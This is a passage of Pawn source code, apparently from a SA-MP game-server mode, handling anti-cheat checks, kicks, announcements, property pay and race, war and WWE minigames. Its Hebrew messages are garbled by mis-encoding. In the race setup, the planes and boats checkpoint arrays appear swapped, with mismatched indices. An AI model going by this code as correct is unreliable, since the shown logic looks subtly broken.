			if((GetPlayerCheckpoint(i) == cp_bank || GetPlayerCheckpoint(i) == cp_ammu) && GetPlayerInterior(i) > 0 && IsPlayerInAnyVehicle(i)) Cheat(i,"Teleporting");
			// Reset Floods
			for(new ii=0;ii<3;ii++) playerinfo[i][flood][ii] = 0;
			// Raise Cost
			if(playerinfo[i][raise] != INVALID_PLAYER_ID)
			{
			    if(playerinfo[i][upgradecmd][lcmdid("/raise")] == 1) GiveMoney(i,0-250);
			    if(playerinfo[i][upgradecmd][lcmdid("/raise")] == 2) GiveMoney(i,0-150);
			    if(playerinfo[i][upgradecmd][lcmdid("/raise")] == 3) GiveMoney(i,0-50);
			    if(GetMoney(i) <= 0) command(i,"/sraise");
			}
			// Charge Ultimate Power
			if(playerinfo[i][upower] != -1 && playerinfo[i][charge] > 0)
			{
				playerinfo[i][charge]++;
				valstr(string,playerinfo[i][charge]);
				format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~r~ultimate power: ~b~%02d~g~~h~~h~(%s~g~~h~~h~)",playerinfo[i][charge],GetProgress(playerinfo[i][charge] / 3));
				GameTextForPlayer(i,string,900,5);
			}
			// Charge Second Ultimate Power
			if(playerinfo[i][upower2] != -1 && playerinfo[i][charge2] > 0)
			{
				playerinfo[i][charge2]++;
				valstr(string,playerinfo[i][charge2]);
				format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~y~second ultimate power: ~b~%02d~g~~h~~h~(%s~g~~h~~h~)",playerinfo[i][charge2],GetProgress(playerinfo[i][charge2] / 3));
				GameTextForPlayer(i,string,900,5);
			}
			// Quickly Defence
			if(playerinfo[i][quicklydefence] > 0) playerinfo[i][quicklydefence]--;
			// Tornado
			if(playerinfo[i][tornado]-- > 0)
			{
			    GetPlayerPos(i,p[0],p[1],p[2]);
			    for(new ii = 0; ii < MAX_PLAYERS; ii++) if(IsPlayerConnected(ii))
			    {
                    GetPlayerPos(ii,op[0],op[1],op[2]);
                    if(op[0] >= p[0] - 15.0 && op[0] <= p[0] + 15.0 &&
                    op[1] >= p[1] - 15.0 && op[1] <= p[1] + 15.0 &&
                    op[2] >= p[2] - 15.0 && op[2] <= p[2] + 15.0) AddPlayerVelocity(ii,floatrand(1.0,10.0),floatrand(1.0,10.0),floatrand(1.0,10.0));
                }
			}
		}
		if(IsPlayerNPC(i))
		{
		    new bool:myNPC = false;
		    for(new n = 0; n < sizeof(NPCs) && !myNPC; n++) if(equal(GetName(i),NPCs[n][npcName])) myNPC = true;
		    if(!myNPC) Cheat(i,"Bot");
		}
	}
	// Fire place
	/*GetSObjectPos(fpinfo[fpUpdate]++,op[0],op[1],op[2]);
	CreateExplosion(op[0],op[1],op[2],4,0.0);
	if(fpinfo[fpUpdate] >= fpinfo[fpEnd]) fpinfo[fpUpdate] = fpinfo[fpStart]; fplacep*/
	// Second auto message
	if(++autoM >= second_auto_message_seconds*60)
	{
		new rnd = random(sizeof(SecondAutoMessage));
		format(string,sizeof(string)," Advertisement: %s",SecondAutoMessage[rnd]);
		SendClientMessageToAll(lightblue,string);
		autoM = 0;
	}
	// Auto Unlocking Vehicles
	if(++afterHour == 3600)
	{
		for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid]) for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(v,i,0,0);
		SendClientMessageToAll(green," *** .ëì äîëåðéåú áùøú ðôúçå àåèåîèéú");
		afterHour = 0;
	}
	return 1;
}
//=[Contents3]==================================================================
public Contents3()
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		    // Anti Ping + Bad Names
			if(GetPlayerPing(i) >= max_ping) SetKick(i,MAX_PLAYERS+1,"ôéðâ âáåä");
			for(new b = 0; b < sizeof(badnames); b++) if(strfind(GetName(i),badnames[b],true) != -1) SetKick(i,MAX_PLAYERS+1,"ëéðåé àñåø");
			// Jetpack update
			if(playerinfo[i][jetpack] && GetPlayerSpecialAction(i) != SPECIAL_ACTION_USEJETPACK) playerinfo[i][jetpack] = 0;
		}
	}
	// Update worldtime rule
	#if usingYSF
		if(setWorldTimeSeconds >= 60)
		{
			UpdateWorldTime();
			setWorldTimeSeconds = 0;
		}
		else setWorldTimeSeconds++;
	#endif
	// Gravity check
	new gravity[16];
	GetServerVarAsString("gravity",gravity,sizeof(gravity));
	if(floatstr(gravity) < 0.001000 || floatstr(gravity) > 0.009000)
	{
		SendClientMessageToAll(red," .äúâìä ëé ëåç äîùéëä áùøú ðîåê àå øá îãé åìëï äåà äåçæø ìëåç äîùéëä äðåøîàìé");
		SetGravity(0.008000);
	}
	// Weather check
	if(!IsValidWeather(GetServerVarAsInt("weather")))
	{
		SendClientMessageToAll(red," .äúâìä ëé îæâ äàåéø áùøú àéðå èåá åìëï äåà äåçæø ìîæâ äàåéø äðåøîàìé");
		SetWeather(0);
	}
	// Bulletin Board
	new string[M_S], c;
	if(!fexist(file_bb))
	{
		fcreate(file_bb);
		for(new i=1;i<4;i++)
		{
			format(string,sizeof(string),"Message%d",i);
			fsetstring(file_bb,string,"None");
		}
	}
	SendClientMessageToAll(lightblue," :ìåç îåãòåú");
	SendClientMessageToAll(yellow,webpage);
	for(new i=1;i<11;i++)
	{
		format(string,sizeof(string),"Message%d",i);
		if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
		{
			format(string,sizeof(string)," (%d) - %s",i,fgetstring(file_bb,string));
			SendClientMessageToAll(yellow,string);
		}
	}
	wangv = randomEx(1,5);
	if(wangv == 4) wangv = -1;
	else
	{
		c = CreateVehicleEx(522,0.0,0.0,0.0,0.0,-1,-1,respawntime,0,world_ghosts);
		DestroyVehicleEx(c);
		wangv = randomEx(1,c);
		//while(GetVehicleType(wangv) > 1) wangv = random(c-1);
		format(string,sizeof(string)," !%s îåñê ååàðâ îçôù àú äøëá",GetVehicleName(GetVehicleModel(wangv)));
		SendClientMessageToAll(yellow,string);
	}
	SendClientMessageToAll(yellow," /bbhelp :ìòæøä áðåùà ìåç äîåãòåú");
	// Real Time System
	new h[2];
	gettime(h[0],h[1],h[1]);
	SetWorldTime(h[0]);
	return 1;
}
//=[AutoMessage]================================================================
public AutoMessage()
{
	if(debugstate) printf("AutoMessage start");
	new File:am, read[256];
	SendClientMessageToAll(lightblue," ~~~ :äåãòä àåèåîèéú ~~~");
	fileCheck(file_am);
	am = fopen(file_am,io_read);
	while(fread(am,read,sizeof(read),false)) SendClientMessageToAll(0xFFFF00AA,read);
	fclose(am);
	SendClientMessageToAll(lightblue," ~~~~~~~~~~~~~~~~~~~");
	if(debugstate) printf("AutoMessage end");
	return 1;
}
//=[PropertiesPay]==============================================================
public PropertiesPay()
{
	if(debugstate) printf("PropertiesPay start");
	new string[M_S], pay[MAX_PLAYERS] = {0,...}, payWithPercent = 0;
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && !playerinfo[i][modeafk] && !(GetPlayerState(i) != PLAYER_STATE_ONFOOT && GetVehicleType(GetPlayerVehicleID(i)) == 5) && !IsPlayerInNPCVehicle(i))
		{
			for(new p=0;p<props;p++) if(propinfo[p][owner] == i) pay[i] += propinfo[p][pearning];
			if(pay[i] > 0 && playerinfo[i][earnings] > 0)
			{
				payWithPercent = pay[i] + (pay[i] * (VIP_PropertyPercentAdditions[playerinfo[i][vip]] / 100));
				format(string,sizeof(string)," .äøååçú %d$ îäðëñéí ùáøùåúê",payWithPercent);
				SendClientMessage(i,yellow,string);
				if(playerinfo[i][earnings] == 2) playerinfo[i][bank] += payWithPercent;
				else if(playerinfo[i][earnings] == 1) GiveMoney(i,payWithPercent);
			}
		}
	}
	if(debugstate) printf("PropertiesPay end");
	return 1;
}
//=[UnGod]======================================================================
public UnGod(playerid,Float:lastth)
{
	SetPlayerHealth2(playerid,lastth);
	playerinfo[playerid][gmtimer] = 0;
	return 1;
}
//=[StartActivity]==============================================================
public StartActivity()
{
	if(debugstate) printf("Gamemode Activity [start]: StartActivity");
	if(ThereIsAct()) return 0;
	new rnd = randomEx(1,8);
	switch(rnd)
	{
		case 1: StartRace(99,randomEx(1,3));
		case 2: StartWar();
		case 3: StartWWE();
		case 4: StartKart();
		case 5: StartMonster();
		case 6: StartSRace();
		case 7: StartKickstar();
	}
	if(debugstate) printf("Gamemode Activity [end]: StartActivity");
	return 1;
}
//=[StartRace]==================================================================
public StartRace(racetype,raceway)
{
	if(debugstate) printf("Gamemode Activity [start]: StartRace");
	new string[M_S];
	if(ThereIsAct()) return 0;
	raceinfo[0] = 1, raceinfo[1] = 0, raceinfo[2] = 60, raceinfo[5] = 3, raceinfo[6] = raceway;
	raceinfo[3] = SetTimer("StartRace2",1000,1);
	raceinfo[4] = (racetype == 99? random(5):racetype);
	SendClientMessageToAll(black,"___________________________________");
	if(raceinfo[4] == race1_cars) SendClientMessageToAll(green," (/race /drifts) !îéøåõ îëåðéåú éúçéì á÷øåá");
	else if(raceinfo[4] == race2_bikes) SendClientMessageToAll(green," (/ramp /stunts) !îéøåõ àåôðåòéí éúçéì á÷øåá");
	else if(raceinfo[4] == race3_planes) SendClientMessageToAll(green," (/ap /as) !îéøåõ îèåñéí éúçéì á÷øåá");
	else if(raceinfo[4] == race4_boats) SendClientMessageToAll(green," (/ships /docks) !îéøåõ ñéøåú éúçéì á÷øåá");
	else if(raceinfo[4] == race5_crazy) SendClientMessageToAll(green," (Crazy Race) !îéøåõ îùåâò éúçéì á÷øåá");
	SendClientMessageToAll(green," /racing join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .äöèøôåú ìîéøåõ òåìä $500");
	SendClientMessageToAll(orange," /racehelp :ìîéãò ðåñó òì äîéøåöéí øùîå àú äô÷åãä");
	format(string,sizeof(string)," .äîéøåõ éúçéì áòåã %d ùðéåú",raceinfo[2]);
	SendClientMessageToAll(brown,string);
	format(string,sizeof(string)," îñìåì îñôø: %d",raceinfo[6]);
	SendClientMessageToAll(grey,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartRace");
	return 1;
}
//=[StartRace2]=================================================================
public StartRace2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartRace2");
	new string[M_S];
	raceinfo[2]--;
	if(raceinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(raceinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~y~Race: ~h~%d",raceinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(raceinfo[2] == 15 || raceinfo[2] == 30)
		{
			format(string,sizeof(string)," .äîéøåõ éúçéì áòåã %d ùðéåú",raceinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /racing join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(raceinfo[2] == 5)
	{
		if(raceinfo[1] < 3) return EndRace(" îñôø äùç÷ðéí ùäöèøôå ÷èï î3",-1);
		new maxcp = 0;
		switch(raceinfo[4])
		{
			case race1_cars, race5_crazy:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_cars1)-8;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_cars2)-8;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_cars3)-8;
			}
			case race2_bikes:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_bikes1)-8;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_bikes2)-8;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_bikes3)-8;
			}
			case race3_planes:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_planes1)-8;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_planes2)-8;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_planes3)-8;
			}
			case race4_boats:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_boats1)-6;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_boats2)-6;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_boats3)-6;
			}
		}
		#pragma unused maxcp
		for(new i=0,id=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitrace])
			{
				SetFreeze(i,1);
				ResetWeapons(i);
				id = playerinfo[i][raceid];
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy:
					{
						if(raceinfo[6] == 1)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_cars1[id][0],RacePositions_cars1[id][1],RacePositions_cars1[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_cars1[id][3]);
						}
						else if(raceinfo[6] == 2)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_cars2[id][0],RacePositions_cars2[id][1],RacePositions_cars2[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_cars2[id][3]);
						}
						else if(raceinfo[6] == 3)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_cars3[id][0],RacePositions_cars3[id][1],RacePositions_cars3[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_cars3[id][3]);
						}
					}
					case race2_bikes:
					{
						if(raceinfo[6] == 1)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_bikes1[id][0],RacePositions_bikes1[id][1],RacePositions_bikes1[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_bikes1[id][3]);
						}
						else if(raceinfo[6] == 2)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_bikes2[id][0],RacePositions_bikes2[id][1],RacePositions_bikes2[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_bikes2[id][3]);
						}
						else if(raceinfo[6] == 3)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_bikes3[id][0],RacePositions_bikes3[id][1],RacePositions_bikes3[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_bikes3[id][3]);
						}
					}
					case race3_planes:
					{
						if(raceinfo[6] == 1)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_planes1[id][0],RacePositions_planes1[id][1],RacePositions_planes1[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_planes1[id][3]);
						}
						else if(raceinfo[6] == 2)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_planes2[id][0],RacePositions_planes2[id][1],RacePositions_planes2[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_planes2[id][3]);
						}
						else if(raceinfo[6] == 3)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_planes3[id][0],RacePositions_planes3[id][1],RacePositions_planes3[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_planes3[id][3]);
						}
					}
					case race4_boats:
					{
						if(raceinfo[6] == 1)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_boats1[id][0],RacePositions_boats1[id][1],RacePositions_boats1[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_boats1[id][3]);
						}
						else if(raceinfo[6] == 2)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_boats2[id][0],RacePositions_boats2[id][1],RacePositions_boats2[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_boats2[id][3]);
						}
						else if(raceinfo[6] == 3)
						{
							SetVehiclePos(GetPlayerVehicleID(i),RacePositions_boats3[id][0],RacePositions_boats3[id][1],RacePositions_boats3[id][2]);
							SetVehicleZAngle(GetPlayerVehicleID(i),RacePositions_boats3[id][3]);
						}
					}
				}
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_race);
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				SetPlayerInterior(i,0);
				SetPlayerVirtualWorld(i,world_race);
				SetVehicleHealth(GetPlayerVehicleID(i),1000.0);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				SetCameraBehindPlayer(i);
				vehicleinfo[GetPlayerVehicleID(i)][racedriver] = i;
				playerinfo[i][racecp] = 8;
				PlayerPlaySound(i,1097,0.0,0.0,0.0);
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(i,0,RacePositions_cars1[8][0],RacePositions_cars1[8][1],RacePositions_cars1[8][2],RacePositions_cars1[9][0],RacePositions_cars1[9][1],RacePositions_cars1[9][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(i,0,RacePositions_cars2[8][0],RacePositions_cars2[8][1],RacePositions_cars2[8][2],RacePositions_cars2[9][0],RacePositions_cars2[9][1],RacePositions_cars2[9][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(i,0,RacePositions_cars3[8][0],RacePositions_cars3[8][1],RacePositions_cars3[8][2],RacePositions_cars3[9][0],RacePositions_cars3[9][1],RacePositions_cars3[9][2],20.0);
					}
					case race2_bikes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(i,0,RacePositions_bikes1[8][0],RacePositions_bikes1[8][1],RacePositions_bikes1[8][2],RacePositions_bikes1[9][0],RacePositions_bikes1[9][1],RacePositions_bikes1[9][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(i,0,RacePositions_bikes2[8][0],RacePositions_bikes2[8][1],RacePositions_bikes2[8][2],RacePositions_bikes2[9][0],RacePositions_bikes2[9][1],RacePositions_bikes2[9][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(i,0,RacePositions_bikes3[8][0],RacePositions_bikes3[8][1],RacePositions_bikes3[8][2],RacePositions_bikes3[9][0],RacePositions_bikes3[9][1],RacePositions_bikes3[9][2],20.0);
					}
					case race3_planes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(i,3,RacePositions_boats1[8][0],RacePositions_boats1[8][1],RacePositions_boats1[8][2],RacePositions_boats1[9][0],RacePositions_boats1[9][1],RacePositions_boats1[9][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(i,3,RacePositions_boats2[8][0],RacePositions_boats2[8][1],RacePositions_boats2[8][2],RacePositions_boats2[9][0],RacePositions_boats2[9][1],RacePositions_boats2[9][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(i,3,RacePositions_boats3[8][0],RacePositions_boats3[8][1],RacePositions_boats3[8][2],RacePositions_boats3[9][0],RacePositions_boats3[9][1],RacePositions_boats3[9][2],20.0);
					}
					case race4_boats:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(i,3,RacePositions_planes1[8][0],RacePositions_planes1[7][1],RacePositions_planes1[7][2],RacePositions_planes1[8][0],RacePositions_planes1[8][1],RacePositions_planes1[8][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(i,3,RacePositions_planes2[8][0],RacePositions_planes2[7][1],RacePositions_planes2[7][2],RacePositions_planes2[8][0],RacePositions_planes2[8][1],RacePositions_planes2[8][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(i,3,RacePositions_planes3[8][0],RacePositions_planes3[7][1],RacePositions_planes3[7][2],RacePositions_planes3[8][0],RacePositions_planes3[8][1],RacePositions_planes3[8][2],20.0);
					}
				}
				SendClientMessage(i,orange," !áäöìçä áîéøåõ");
			}
		}
	}
	if(raceinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitrace])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][inrace] = 1, playerinfo[i][waitrace] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(raceinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartRace2");
	return 1;
}
//=[StartWar]===================================================================
public StartWar()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWar");
	new string[M_S], wartype[64];
	if(ThereIsAct()) return 0;
	warinfo[0] = 1, warinfo[1] = 0, warinfo[2] = 60, warinfo[3] = SetTimer("StartWar2",1000,1);
	if(!warinfo[5]) warinfo[5] = randomEx(1,4);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !îìçîú ùøú úúçéì á÷øåá");
	SendClientMessageToAll(green," /swar join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .äöèøôåú ìîìçîú äùøú òåìä 400$");
	SendClientMessageToAll(orange," /swarhelp :ìîéãò ðåñó òì îìçîåú äùøú øùîå àú äô÷åãä");
	format(string,sizeof(string)," .äîìçîä úúçéì áòåã %d ùðéåú",warinfo[2]);
	SendClientMessageToAll(brown,string);
	switch(warinfo[5])
	{
		case 1: wartype = "War";
		case 2: wartype = "Fire Madness";
		case 3: wartype = "Iraq";
	}
	format(string,sizeof(string)," .[#%d] %s :æéøä",warinfo[5],wartype);
	SendClientMessageToAll(grey,string);
	switch(warinfo[4])
	{
		case 0: wartype = "Random";
		case 1: wartype = "Chainsaw";
		case 2: wartype = "Grenade";
		case 3: wartype = "Molotov";
		case 4: wartype = "Pistol";
		case 5: wartype = "Silenced";
		case 6: wartype = "Desert Eagle";
		case 7: wartype = "Shotgun";
		case 8: wartype = "Sawnoff";
		case 9: wartype = "Combat";
		case 10: wartype = "MicroUzi";
		case 11: wartype = "MP5";
		case 12: wartype = "Tec9";
		case 13: wartype = "AK47";
		case 14: wartype = "M4";
		case 15: wartype = "Sniper";
		case 16: wartype = "RocketLauncher";
		case 17: wartype = " ëì äðù÷éí äðåëçééí ùéù ìëì ùç÷ï";
	}
	format(string,sizeof(string),warinfo[4] == 17? (" .[#%d] ðù÷: %s"):(" .[#%d] %s :ðù÷"),warinfo[4],wartype);
	SendClientMessageToAll(grey,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartWar");
	return 1;
}
//=[StartWar2]==================================================================
public StartWar2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWar2");
	new string[M_S];
	warinfo[2]--;
	if(warinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(warinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~War: ~h~%d",warinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(warinfo[2] == 10 || warinfo[2] == 30)
		{
			format(string,sizeof(string)," .äîìçîä úúçéì áòåã %d ùðéåú",warinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /swar join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(warinfo[2] == 5)
	{
		if(warinfo[1] < 2) return EndWar(" îñôø äùç÷ðéí ùäöèøôå ÷èï î2",-1);
		for(new i=0,id=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwar])
			{
				SetFreeze(i,1);
				id = playerinfo[i][warid];
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				switch(warinfo[5])
				{
					case 1:
					{
						SetPlayerPos(i,WarPositions[id][0],WarPositions[id][1],WarPositions[id][2]);
						SetPlayerFacingAngle(i,WarPositions[id][3]);
					}
					case 2:
					{
						SetPlayerPos(i,WarPositions2[id][0],WarPositions2[id][1],WarPositions2[id][2]);
						SetPlayerFacingAngle(i,WarPositions2[id][3]);
					}
					case 3:
					{
						SetPlayerPos(i,WarPositions3[id][0],WarPositions3[id][1],WarPositions3[id][2]);
						SetPlayerFacingAngle(i,WarPositions3[id][3]);
					}
				}
				SetPlayerVirtualWorld(i,world_war);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				SetPlayerHealth2(i,100.0);
				SetPlayerArmour2(i,100.0);
				if(warinfo[4] != 17) ResetWeapons(i);
				switch(warinfo[4])
				{
					case 0: GiveWeapon(i,warweapons[random(sizeof(warweapons))],100000);
					case 1: GiveWeapon(i,9,0);
					case 2: GiveWeapon(i,16,100000);
					case 3: GiveWeapon(i,18,100000);
					case 4: GiveWeapon(i,22,100000);
					case 5: GiveWeapon(i,23,100000);
					case 6: GiveWeapon(i,24,100000);
					case 7: GiveWeapon(i,25,100000);
					case 8: GiveWeapon(i,26,100000);
					case 9: GiveWeapon(i,27,100000);
					case 10: GiveWeapon(i,28,100000);
					case 11: GiveWeapon(i,29,100000);
					case 12: GiveWeapon(i,32,100000);
					case 13: GiveWeapon(i,30,100000);
					case 14: GiveWeapon(i,31,100000);
					case 15: GiveWeapon(i,34,100000);
					case 16: GiveWeapon(i,35,100000);
				}
				playerinfo[i][gw] = 1;
				SetPlayerInterior(i,16);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !áäöìçä áîìçîú äùøú");
				PlayerPlaySound(i,1083,0.0,0.0,0.0);
			}
		}
	}
	if(warinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwar])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][inwar] = 1, playerinfo[i][waitwar] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(warinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartWar2");
	return 1;
}
//=[StartWWE]===================================================================
public StartWWE()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWWE");
	new string[M_S];
	if(ThereIsAct()) return 0;
	wweinfo[0] = 1, wweinfo[1] = 0, wweinfo[2] = 30, wweinfo[3] = SetTimer("StartWWE2",1000,1);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !úúçéì á÷øåá WWE úçøåú");
	SendClientMessageToAll(green," /wwe join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .òåìä 150$ WWE äöèøôåú ìúçøåú ä");
	SendClientMessageToAll(orange," /wwehelp :øùîå àú äô÷åãä WWE ìîéãò ðåñó òì úçøåú ä");
	format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú WWE úçøåú ä",wweinfo[2]);
	SendClientMessageToAll(brown,string);
	format(string,sizeof(string)," .#%d :îñôø æéøä",wweinfo[4]);
	SendClientMessageToAll(grey,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartWWE");
	return 1;
}
//=[StartWWE2]==================================================================
public StartWWE2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartWWE2");
	new string[M_S];
	wweinfo[2]--;
	if(wweinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(wweinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~WWE: ~h~%d",wweinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(wweinfo[2] == 10)
		{
			format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú WWE úçøåú ä",wweinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /wwe join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(wweinfo[2] == 5)
	{
		if(wweinfo[1] < 2) return EndWWE(" îñôø äùç÷ðéí ùäöèøôå ÷èï î2",-1);
		for(new i=0,id=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwwe])
			{
				SetFreeze(i,1);
				id = playerinfo[i][wweid];
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				ResetWeapons(i);
				SetPlayerPos(i,WWEPositions[id + wweinfo[4]][0],WWEPositions[id + wweinfo[4]][1],WWEPositions[id + wweinfo[4]][2]);
				SetPlayerFacingAngle(i,WWEPositions[id + wweinfo[4]][3]);
				SetPlayerVirtualWorld(i,world_wwe);
				SetFreeze(i,1);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				SetPlayerInterior(i,5);
				SetCameraBehindPlayer(i);
				PlayerPlaySound(i,1068,0.0,0.0,0.0);
			}
		}
	}
	if(wweinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitwwe])
			{
